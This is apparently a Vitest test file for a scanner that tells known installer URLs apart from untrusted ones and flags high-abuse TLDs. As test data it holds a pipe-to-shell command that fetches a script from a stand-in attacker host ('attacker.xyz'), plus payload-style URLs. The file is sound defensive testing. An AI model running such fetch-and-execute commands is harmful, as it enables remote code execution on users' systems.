import { describe, expect, it } from "vitest";
import {
	hasHighAbuseTldHost,
	hasHighAbuseTldInText,
	isKnownInstallerTarget,
} from "../../src/scanner/url-risk.js";

describe("url-risk: isKnownInstallerTarget", () => {
	it.each([
		"curl https://sh.rustup.rs | sh",
		"curl -fsSL https://deno.land/install.sh | sh",
		"wget -qO- https://get.pnpm.io/install.sh",
		"https://raw.githubusercontent.com/nvm-sh/nvm/v0.39/install.sh",
		"https://get.docker.com",
		"https://volta.sh",
	])("recognizes known installer: %s", (text) => {
		expect(isKnownInstallerTarget(text)).toBe(true);
	});

	it.each([
		"https://evil.example/install.sh",
		"curl https://attacker.xyz/x.sh | bash",
		"https://raw.githubusercontent.com/someone-else/repo/main/setup.sh",
		"just some prose with no url",
	])("does not flag non-installer: %s", (text) => {
		expect(isKnownInstallerTarget(text)).toBe(false);
	});
});

describe("url-risk: high-abuse TLDs", () => {
	it.each(["foo.xyz", "a.b.top", "host.buzz", "x.tk", "y.icu"])(
		"hasHighAbuseTldHost true for %s",
		(host) => {
			expect(hasHighAbuseTldHost(host)).toBe(true);
		},
	);

	it.each(["example.com", "foo.io", "bar.dev", "trusted.org"])(
		"hasHighAbuseTldHost false for %s",
		(host) => {
			expect(hasHighAbuseTldHost(host)).toBe(false);
		},
	);

	it("hasHighAbuseTldHost anchors at end (no false match mid-host)", () => {
		// ".top" appears but is not the TLD — must not match the host helper.
		expect(hasHighAbuseTldHost("top.example.com")).toBe(false);
		expect(hasHighAbuseTldHost("xyz.example.com")).toBe(false);
	});

	it("hasHighAbuseTldInText detects abuse TLD followed by slash or boundary", () => {
		expect(hasHighAbuseTldInText("download from http://payload.top/x.sh")).toBe(true);
		expect(hasHighAbuseTldInText("see http://a.click and run")).toBe(true);
		expect(hasHighAbuseTldInText("visit https://example.com/path")).toBe(false);
	});
});
